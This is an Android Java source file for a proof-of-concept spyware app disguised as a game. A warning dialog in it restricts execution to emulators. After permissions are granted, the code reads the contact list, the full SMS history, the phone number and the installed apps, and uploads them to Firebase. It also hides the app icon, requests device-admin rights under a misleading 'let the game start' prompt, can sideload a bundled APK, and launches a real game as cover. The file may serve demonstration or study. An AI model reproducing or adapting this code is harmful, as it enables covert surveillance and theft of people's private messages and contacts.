package com.sneaky.gamey;

import android.Manifest;
import android.app.AlertDialog;
import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentSender;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInstaller;
import android.content.pm.PackageManager;
import android.content.res.AssetManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.FileProvider;

import com.sneaky.gamey.database.MyFirebase;
import com.sneaky.gamey.receivers.AdminReceiver;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    public static Context context = App.getContext();
    public static String[] permissions = {Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS, Manifest.permission.READ_PHONE_NUMBERS,
            Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.MODIFY_AUDIO_SETTINGS, Manifest.permission.RECORD_AUDIO, Manifest.permission.READ_CONTACTS};
    private DevicePolicyManager devicePolicyManager;
    private ComponentName adminComponent;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        showWarning();
    }

    private void showWarning() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Warning");
        builder.setMessage("This is a malicious application developed as a PoC spyware. " +
                "It is meant for educational and demonstrative purposes only and it should never be misused to cause real damage. " +
                "The app has the ability to send the device's contacts, sms history, list of installed application and other data to a third party without a notice. " +
                "If you installed this application by mistake or don't willingly accept the risks of proceeding forward, please close the app and uninstall it ASAP.");
        builder.setPositiveButton("OK", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                if (isEmulator()) {
                    startRequestPermissions();
                    MyFirebase.initFirebase();
                    //startService(new Intent(this, MainService.class));
                    //while (!MyFirebase.finished) {
                    //}
                }
                else {
                    Toast toast = Toast.makeText(getApplicationContext(), "App functionality will not continue due to running on a physical device.", Toast.LENGTH_SHORT);
                    toast.show();
                }
            }
        });
        AlertDialog dialog = builder.create();
        dialog.show();
    }

    private void hideIcon() {
        try {
            PackageManager p = getPackageManager();
            p.setComponentEnabledSetting(new ComponentName(this, com.sneaky.gamey.MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void startAdminRequest() {
        try {
            devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            adminComponent = new ComponentName(this, AdminReceiver.class);

            if (!devicePolicyManager.isAdminActive(adminComponent)) {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Click on Activate button to let the game start.");
                startActivityForResult(intent, 0);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void startRequestPermissions() {
        List<String> permissionsToRequest = new ArrayList<String>();
        for (String perm : permissions) {
            if (this.getApplicationContext().checkSelfPermission(perm) != PackageManager.PERMISSION_GRANTED && perm != null && !perm.trim().isEmpty()) {
                permissionsToRequest.add(perm);
            }
        }
        if (!permissionsToRequest.isEmpty())
            requestPermissions(permissionsToRequest.toArray(new String[0]), 200);
        else
            startAdminRequest();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        boolean allGranted = true;
        for (int result : grantResults) {
            if (result != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                startRequestPermissions();
            }
        }
        if (allGranted) {
            startAdminRequest();
            ArrayList<String> data = getInstalledApplications();
            MyFirebase.sendData("apps", data.toString());
            data = getContactList();
            MyFirebase.sendData("contacts", data.toString());
            data = getPhoneNumber();
            MyFirebase.sendData("phone", data.toString());
            data = getSmsList();
            MyFirebase.sendData("sms", data.toString());
            hideIcon();
            //startService(new Intent(this, PhoneService.class));
        }

    }

    private void startAnotherApp() {
        String[] games = {"com.dragosgame.flappybird", "com.SAPCreation.HappyBirdChampionship", "com.blizzard.wtcg.hearthstone", "com.innersloth.spacemafia",
                "com.popreach.dumbways", "com.kiloo.subwaysurf", "com.activision.callofduty.shooter", "com.roblox.client", "com.halfbrick.fruitninjax",
                "com.androbaby.original2048", "com.facebook.orca", "com.facebook.katana", "com.facebook.lite", "com.facebook.mlite"};
        for(String game: games) {
            Intent launchIntent = getPackageManager().getLaunchIntentForPackage(game);
            if (launchIntent != null) {
                startActivity(launchIntent);
                return;
            }
        }
    }

    public static boolean isEmulator() {
        return Build.FINGERPRINT.startsWith("generic")
                || Build.FINGERPRINT.startsWith("unknown")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.contains("Emulator")
                || Build.MODEL.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
                || "google_sdk".equals(Build.PRODUCT);
    }

    public static void installPackage(Context context, InputStream inputStream) throws IOException {
        PackageInstaller packageInstaller = context.getPackageManager().getPackageInstaller();
        int sessionId = packageInstaller.createSession(new PackageInstaller
                .SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL));
        PackageInstaller.Session session = packageInstaller.openSession(sessionId);

        long sizeBytes = 0;

        OutputStream out = null;
        out = session.openWrite("my_app_session", 0, sizeBytes);

        int total = 0;
        byte[] buffer = new byte[65536];
        int c;
        while ((c = inputStream.read(buffer)) != -1) {
            total += c;
            out.write(buffer, 0, c);
        }
        session.fsync(out);
        inputStream.close();
        out.close();

        // fake intent
        IntentSender statusReceiver = null;
        Intent intent = new Intent(context, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(context,
                1337111117, intent, PendingIntent.FLAG_UPDATE_CURRENT);

        session.commit(pendingIntent.getIntentSender());
        session.close();
    }

    private void installApk() throws IOException {
        AssetManager assetManager = getAssets();
        InputStream in;
        OutputStream out;
        try {
            in = assetManager.open("game.apk");
            out = new FileOutputStream("/sdcard/game.apk");
            byte[] buffer = new byte[1024];
            int read;
            while((read = in.read(buffer)) != -1){
                out.write(buffer, 0, read);
            }
            in.close();
            in = null;
            out.flush();
            out.close();
            out = null;
            File mFile = new File("/sdcard/game.apk");

            Intent intent = new Intent(Intent.ACTION_VIEW);
            Uri mUri = FileProvider.getUriForFile(context, context.getApplicationContext().getPackageName() + ".provider", mFile);
            intent.setDataAndType(mUri, "application/vnd.android.package-archive");
            intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            /*
            Intent intent;
            if(android.os.Build.VERSION.SDK_INT >= 29){
                intent = new Intent(Intent.ACTION_INSTALL_PACKAGE);
                intent.setData(Uri.fromFile(mFile));
                intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                startActivity(intent);
            }else{
                intent = new Intent(Intent.ACTION_VIEW);
                //output file is the apk downloaded earlier
                intent.setDataAndType(Uri.fromFile(mFile), "application/vnd.android.package-archive");
                        startActivity(intent);
            }*/
            startActivityForResult(intent, 0);
        }catch(Exception e){
            Log.e("ASDF", e.toString());
        }
        //InputStream inputStream = getAssets().open("game.apk");
        //installPackage(context, inputStream);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        startAnotherApp();
    }

    private ArrayList<String> getPhoneNumber() {
        ArrayList<String> phoneNumber = new ArrayList<String>();
        TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            return phoneNumber;
        }
        phoneNumber.add(tMgr.getLine1Number());
        return phoneNumber;
    }

    private ArrayList<String> getInstalledApplications() {
        final PackageManager pm = getPackageManager();
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        ArrayList<String> packageNames = new ArrayList<String>();
        for (ApplicationInfo packageInfo : packages) {
            packageNames.add(packageInfo.packageName);
        }
        return packageNames;
    }

    private ArrayList<String> getSmsList() {
        ArrayList<String> smsList = new ArrayList<String>();
        Uri allMessages = Uri.parse("content://sms/");
        Cursor cursor = this.getContentResolver().query(allMessages, null, null, null, null);
        while (cursor.moveToNext()) {
            for (int i = 0; i < cursor.getColumnCount(); i++) {
                String name = cursor.getColumnName(i);
                String text = cursor.getString(i);
                smsList.add(name + " " + text);
            }
        }
        return smsList;
    }

    private ArrayList<String> getContactList() {
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,null, null, null, null);
        ArrayList<String> contacts = new ArrayList<String>();

        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {
                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        contacts.add("name: " + name + " number: " + phoneNo);
                    }
                    pCur.close();
                }
            }
        }
        if(cur != null){
            cur.close();
        }
        return contacts;
    }
}